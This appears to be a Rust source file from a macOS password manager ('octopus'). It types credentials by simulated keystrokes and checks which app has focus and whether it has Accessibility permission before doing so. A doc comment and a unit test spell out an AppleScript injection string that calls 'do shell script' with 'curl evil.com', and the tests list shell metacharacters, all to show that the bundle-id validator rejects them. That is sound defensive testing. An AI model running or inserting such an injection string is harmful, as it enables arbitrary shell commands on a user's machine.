//! macOS Auto-Type：用 enigo 模拟键盘输入。
//!
//! 关键：密码字段（masked input）能正常接收 CGEvent 输入，
//! 因为 enigo 发的是真实键盘事件，浏览器收到的是按键而非 DOM 填值。

use anyhow::{Context, Result};
use std::process::Command;
use std::time::{Duration, Instant};

use enigo::{Direction, Enigo, Key, Keyboard, Settings};

// macOS Accessibility 权限检查 FFI（enigo 用 CGEvent 注入需要 AX 权限）
//
// **2026-07-20 e2e 诊断**：用户报告"autotype_login Ok 但浏览器没收到按键"——
// 典型的 AX 权限缺失症状（enigo 用 CGEvent.post() 静默失败，不报错）。
// 在注入前主动检查 + 日志，让权限问题可见。
#[link(name = "ApplicationServices", kind = "framework")]
unsafe extern "C" {
    fn AXIsProcessTrustedWithOptions(options: *const std::ffi::c_void) -> bool;
}

/// 检查当前 app 是否有 Accessibility 权限。
///
/// enigo 用 CGEvent.post() 注入键盘事件——macOS 要求调用方有 AX 权限。
/// 权限缺失时 CGEvent.post() **静默失败**（enigo 返 Ok 但没真的注入），
/// 这是 autotype Ok 但浏览器没收到按键的最常见根因。
fn check_accessibility_trusted() -> bool {
    // options=nil：不弹系统提示框（我们只想静默检查）
    unsafe { AXIsProcessTrustedWithOptions(std::ptr::null()) }
}

/// 首次焦点等待——hide VaultPicker 后浏览器回前台需要时间。
///
/// **2026-07-20 e2e 修复**：原值 100ms 在 macOS 上太短——hide 一个 always_on_top
/// 窗口后把焦点还给前一个 app（浏览器）实测需要 200-400ms，特别是冷启动或大窗口。
/// 100ms 时 verify_focused 检测到 frontmost 仍是 octopus（或第三方抢焦），bail → fallback
/// 到剪贴板（用户看到"自动填充没成功"）。
const FOCUS_WAIT: Duration = Duration::from_millis(300);

/// verify_focused 重试窗口——若 FOCUS_WAIT 后前台仍未切到期望 app，在此时长内
/// 每 50ms 重试一次（最多 ~6 次），让 macOS 焦点动画有时间完成。
///
/// 单次失败就 bail 太脆弱（用户报告 mail.163.com 密码框按 Cmd+Shift+L 自动填充失败）。
/// verify_focused(None)（仅校验前台 ≠ octopus）放宽到「轮询直到 ≠ octopus 或超时」。
const VERIFY_FOCUS_RETRY_WINDOW: Duration = Duration::from_millis(500);
const VERIFY_FOCUS_POLL_INTERVAL: Duration = Duration::from_millis(50);

/// octopus 自身 bundle id（与 tauri.conf.json identifier 必须一致）。
///
/// 修复 E：原硬编码字符串散在 verify_focused 内，identifier 改动不会编译报错。
/// 现在集中定义 + 加测试断言与 tauri 配置一致。
///
/// 注意：tauri::generate_context! 在编译期把 tauri.conf.json 的 identifier 嵌入，
/// 但运行时取它需要走 tauri::App::config().identifier()。本常量在 autotype 模块
/// 独立可用（不依赖 Tauri runtime），所以是必要的"软约束"——靠测试锁死。
pub const OCTOPUS_BUNDLE_ID: &str = "com.octopus.desktop";

/// 把指定 bundle_id 的 app 激活到前台。
///
/// **bundle_id 白名单校验**（修复 #10）：bundle_id 必须匹配
/// `^[A-Za-z0-9.\-]{1,256}$`——只允许字母/数字/`.`/`-`，长度 1-256。
/// 防止任意字符注入 AppleScript（如 `x") & "do shell script \"curl evil.com\"" & ("`）。
///
/// 当前 activate_app 是 dead code（无生产调用），但未来 Actionbar 集成密码生成器
/// 独立窗口等场景会用到——白名单作为防御性校验，启用前先就位。
pub fn activate_app(bundle_id: &str) -> Result<()> {
    validate_bundle_id(bundle_id)?;
    let script = format!(r#"tell application id "{}" to activate"#, bundle_id);
    let output = Command::new("osascript")
        .arg("-e")
        .arg(&script)
        .output()
        .context("osascript 调用失败")?;
    if !output.status.success() {
        anyhow::bail!(
            "activate {} 失败: {}",
            bundle_id,
            String::from_utf8_lossy(&output.stderr)
        );
    }
    Ok(())
}

/// 模拟键盘输入 username + Tab + password[ + Tab + Enter]。
///
/// **焦点安全**（防钓鱼注入）：
/// - `expected_bundle_id: Some(id)`：注入前校验前台必须是指定 bundle id，否则 bail。
///   用于已知浏览器场景（未来扩展：autotype 命令拿浏览器 bundle_id 后传入）。
/// - `expected_bundle_id: None`：仅校验前台**不是 octopus 自己**——这是最小防护，
///   避免焦点被抢到 octopus 自己的窗口时把密码打到用户能直接看到的地方。
///   仍可能被第三方 app 拦截，但已经挡住最常见的"VaultPicker 没 hide 就注入"事故。
///
/// 校验时机：sleep FOCUS_WAIT 后、username 前；Tab 后、password 前。
/// 校验失败立即 bail，不输入密码；上层降级到剪贴板并提示用户。
/// 旧版 API（兼容）：等价于 `autotype_login_with_mode(username, password,
/// UsernamePassword, press_enter, expected_bundle_id)`。
///
/// 保留是为了 `password_generator_autotype`（生成器场景，传 `""` 作 username）
/// 和潜在的外部调用方。新代码应直接调 `autotype_login_with_mode` 显式传 mode。
pub fn autotype_login(
    username: &str,
    password: &str,
    press_enter: bool,
    expected_bundle_id: Option<&str>,
) -> Result<()> {
    // 旧 API 调用方（如 password_generator_autotype 传 username=""）我们当成
    // PasswordOnly 处理——避免空 username + Tab + password 的怪异行为。
    let mode = if username.is_empty() {
        crate::vault_commands::AutoTypeMode::PasswordOnly
    } else {
        crate::vault_commands::AutoTypeMode::UsernamePassword
    };
    autotype_login_with_mode(username, password, mode, press_enter, expected_bundle_id)
}

/// 三模式 autotype（2026-07-20 新增）。
///
/// 模式由调用方（vault_commands::vault_autotype 据 Tauri 参数）传入：
/// - `UsernamePassword`：username → Tab → password → (Enter?)。旧行为，假设焦点在
///   username 框且网站 Tab 正常。
/// - `PasswordOnly`：仅注入 password 到当前焦点。最稳健，webmail SPA 首选。
/// - `UsernameOnly`：仅注入 username 到当前焦点。"换用户名"场景。
///
/// 共同前置：AX 权限检查 + FOCUS_WAIT + verify_focused + AppleScript activate 前台。
pub fn autotype_login_with_mode(
    username: &str,
    password: &str,
    mode: crate::vault_commands::AutoTypeMode,
    press_enter: bool,
    expected_bundle_id: Option<&str>,
) -> Result<()> {
    use crate::vault_commands::AutoTypeMode;

    // **2026-07-20 e2e 诊断**：AX 权限检查放最前——若缺失，后续 enigo 全部静默失败。
    let ax_trusted = check_accessibility_trusted();
    log::info!("[autotype] AX 权限：{}，mode={:?}", ax_trusted, mode);
    if !ax_trusted {
        log::warn!(
            "[autotype] ⚠️ AX 权限缺失——enigo CGEvent 注入会静默失败，浏览器收不到按键"
        );
    }

    std::thread::sleep(FOCUS_WAIT);

    // 注入前先校验焦点——若已切到第三方 app，立即放弃注入
    verify_focused(expected_bundle_id)?;

    // **2026-07-20 e2e 修复**：前台 bundle id 是 Chrome ≠ input element 有 focus。
    // hide VaultPicker 后 Chrome 拿到 window focus，但 input element 的 DOM focus
    // 可能丢失（webmail SPA 的 focus 管理复杂）。enigo 注入到没有 input focus 的页面
    // 会导致"enigo Ok 但浏览器收不到按键"。
    //
    // 修复：读当前前台 bundle_id，用 AppleScript 让它 activate——比 CGEvent post 更强力，
    // 会触发完整窗口聚焦 + 通常让浏览器恢复上次的 input focus。
    let frontmost_at_start = super::url_detect::frontmost_bundle_id()
        .unwrap_or_else(|_| "<unknown>".into());
    let frontmost_trimmed = frontmost_at_start.trim();
    log::info!(
        "[autotype] 开始注入：frontmost={}, mode={:?}, username_len={}, password_len={}",
        frontmost_trimmed,
        mode,
        username.len(),
        password.len()
    );

    // AppleScript 激活前台 app（已知是 Chrome/浏览器），强制刷新窗口焦点 + DOM focus
    if !frontmost_trimmed.is_empty()
        && frontmost_trimmed != OCTOPUS_BUNDLE_ID
        && validate_bundle_id(frontmost_trimmed).is_ok()
    {
        let script = format!(
            r#"tell application id "{}" to activate"#,
            frontmost_trimmed
        );
        match Command::new("osascript").arg("-e").arg(&script).output() {
            Ok(out) if out.status.success() => {
                log::debug!("[autotype] activate {} 成功", frontmost_trimmed);
            }
            Ok(out) => {
                log::warn!(
                    "[autotype] activate {} 失败：{}",
                    frontmost_trimmed,
                    String::from_utf8_lossy(&out.stderr)
                );
            }
            Err(e) => {
                log::warn!("[autotype] osascript 调用失败：{}", e);
            }
        }
        // activate 后让 Chrome 重建 DOM focus
        std::thread::sleep(Duration::from_millis(150));
    }

    let mut enigo = Enigo::new(&Settings::default()).context("enigo 初始化失败")?;

    match mode {
        AutoTypeMode::UsernamePassword => {
            // username → Tab → password
            enigo.text(username).context("输入 username 失败")?;
            log::debug!("[autotype] username 注入完成");
            enigo.key(Key::Tab, Direction::Click).context("Tab 输入失败")?;
            std::thread::sleep(Duration::from_millis(30));
            verify_focused(expected_bundle_id)?;
            enigo.text(password).context("输入 password 失败")?;
            log::debug!("[autotype] password 注入完成");
        }
        AutoTypeMode::PasswordOnly => {
            enigo.text(password).context("输入 password 失败")?;
            log::debug!("[autotype] password 注入完成（PasswordOnly）");
        }
        AutoTypeMode::UsernameOnly => {
            enigo.text(username).context("输入 username 失败")?;
            log::debug!("[autotype] username 注入完成（UsernameOnly）");
        }
    }

    if press_enter {
        std::thread::sleep(Duration::from_millis(30));
        enigo
            .key(Key::Return, Direction::Click)
            .context("Enter 输入失败")?;
    }
    Ok(())
}

/// 校验当前前台 app 符合期望。
///
/// - `Some(expected)`：前台必须 == expected，否则 bail（严格白名单）。
///   短轮询重试 `VERIFY_FOCUS_RETRY_WINDOW` 时长，给焦点切换动画时间。
/// - `None`：前台只需 ≠ octopus 自身 bundle id（最小防御，防焦点抢到 octopus 窗口）。
///   同样短轮询——hide VaultPicker 后 macOS 把焦点还给浏览器需要时间。
///
/// **fail-closed**（修复 D）：osascript 失败（权限缺失/被回收）时 bail，不静默放行。
/// 避免安全校验在权限缺失时失效。
///
/// **重试机制**（2026-07-20 e2e 修复）：macOS hide always_on_top 窗口后焦点回切有延迟，
/// 单次 verify 可能误判（frontmost 仍是 octopus 或第三方），在 `VERIFY_FOCUS_RETRY_WINDOW`
/// 时长内每 `VERIFY_FOCUS_POLL_INTERVAL` 重试一次，让焦点动画完成。
///
/// 不一致时返回 Err——调用方应放弃按键注入，降级到剪贴板路径。
fn verify_focused(expected_bundle_id: Option<&str>) -> Result<()> {
    let deadline = Instant::now() + VERIFY_FOCUS_RETRY_WINDOW;
    let expected_norm = expected_bundle_id.map(|s| s.trim()).unwrap_or("");
    let mut attempts = 0u32;

    loop {
        attempts += 1;
        // osascript 失败 → 直接 bail（fail-closed，修复 D）
        let actual = super::url_detect::frontmost_bundle_id()
            .context("无法读取前台 bundle id（osascript 权限缺失?），fail-closed")?
            .trim()
            .to_string();

        let ok = match expected_bundle_id {
            Some(expected) => actual == expected.trim(),
            // 修复 E：用 OCTOPUS_BUNDLE_ID 常量，避免硬编码散落
            None => actual != OCTOPUS_BUNDLE_ID,
        };

        if ok {
            if attempts > 1 {
                log::debug!(
                    "[autotype] verify_focused 通过（第 {} 次轮询，actual={}）",
                    attempts,
                    actual
                );
            }
            return Ok(());
        }

        if Instant::now() >= deadline {
            // 超时仍失败——bail
            let reason = match expected_bundle_id {
                Some(_) => format!(
                    "焦点已切换（期望 {expected_norm}，实际 {actual}）——放弃按键注入防钓鱼"
                ),
                None => format!(
                    "焦点仍在 octopus 自身或被抢焦（{actual}）——放弃按键注入防泄露"
                ),
            };
            log::warn!(
                "[autotype] verify_focused 失败：{}（轮询 {} 次仍不满足）",
                reason,
                attempts
            );
            anyhow::bail!(reason);
        }

        std::thread::sleep(VERIFY_FOCUS_POLL_INTERVAL);
    }
}

/// 校验 bundle_id 格式合法——只允许字母/数字/`.`/`-`，长度 1-256。
///
/// 防御 AppleScript 字符串字面量注入：拼接 `tell application id "{bundle_id}"` 时，
/// 若 bundle_id 含 `"` 或换行可注入任意 AppleScript 语句 → shell 执行。
///
/// 用 char-level 校验避免引入 regex crate 依赖（desktop crate 当前无 regex）。
fn validate_bundle_id(bundle_id: &str) -> Result<()> {
    if bundle_id.is_empty() || bundle_id.len() > 256 {
        anyhow::bail!("bundle_id 长度非法（{}，需 1-256）", bundle_id.len());
    }
    for c in bundle_id.chars() {
        if !c.is_ascii_alphanumeric() && c != '.' && c != '-' {
            anyhow::bail!(
                "bundle_id {:?} 含非法字符 {:?}（只允许 A-Za-z0-9.-）",
                bundle_id,
                c
            );
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    /// 修复 E：常量必须与 tauri.conf.json identifier 一致。
    /// tauri.conf.json 改 identifier 时，本测试会失败提醒同步。
    ///
    /// 用 include_str! 编译期读 tauri.conf.json 文本，正则匹配 identifier 字段。
    /// 比 generate_context!().config().identifier 简单（不依赖 Tauri runtime 类型）。
    #[test]
    fn test_octopus_bundle_id_matches_tauri_config() {
        let conf = include_str!("../../tauri.conf.json");
        // 简单子串匹配——identifier 字段在 conf 里唯一
        let needle = "\"identifier\": \"com.octopus.desktop\"";
        assert!(
            conf.contains(needle),
            "tauri.conf.json 缺少 identifier={}——OCTOPUS_BUNDLE_ID 校验会失效",
            needle
        );
        // 顺带校验常量本身
        assert_eq!(OCTOPUS_BUNDLE_ID, "com.octopus.desktop");
    }

    /// 修复 #10：bundle_id 白名单——合法格式应通过。
    #[test]
    fn test_validate_bundle_id_accepts_legal() {
        assert!(validate_bundle_id("com.apple.Safari").is_ok());
        assert!(validate_bundle_id("com.google.Chrome").is_ok());
        assert!(validate_bundle_id("org.mozilla.firefox").is_ok());
        assert!(validate_bundle_id("com.microsoft.edgemac").is_ok());
        assert!(validate_bundle_id("company.thebrowser.Browser").is_ok());
        assert!(validate_bundle_id("a").is_ok()); // 单字符
        assert!(validate_bundle_id("com.example-app.sub-module").is_ok()); // 含 -
    }

    /// 修复 #10：bundle_id 白名单——非法格式应拒绝（防 AppleScript 注入）。
    #[test]
    fn test_validate_bundle_id_rejects_injection_attempts() {
        // 引号注入——拼接 AppleScript 字符串字面量时危险
        assert!(
            validate_bundle_id("x\") & \"do shell script \\\"curl evil.com\\\"").is_err(),
            "双引号注入必须拒绝"
        );
        assert!(validate_bundle_id("has\"quote").is_err());
        // 空串 / 过长
        assert!(validate_bundle_id("").is_err());
        assert!(validate_bundle_id(&"a".repeat(257)).is_err());
        // 含空格 / 特殊字符
        assert!(validate_bundle_id("has space").is_err());
        assert!(validate_bundle_id("has;semicolon").is_err());
        assert!(validate_bundle_id("has\nnewline").is_err());
        assert!(validate_bundle_id("中文").is_err()); // 非 ASCII
        assert!(validate_bundle_id("shell$injection").is_err());
        // 各类 shell 元字符
        for c in ['$', '`', '|', '&', ';', '(', ')', '<', '>', '*', '?', '\\', '\''] {
            assert!(
                validate_bundle_id(&format!("evil{}char", c)).is_err(),
                "字符 {:?} 应被拒绝",
                c
            );
        }
    }
}
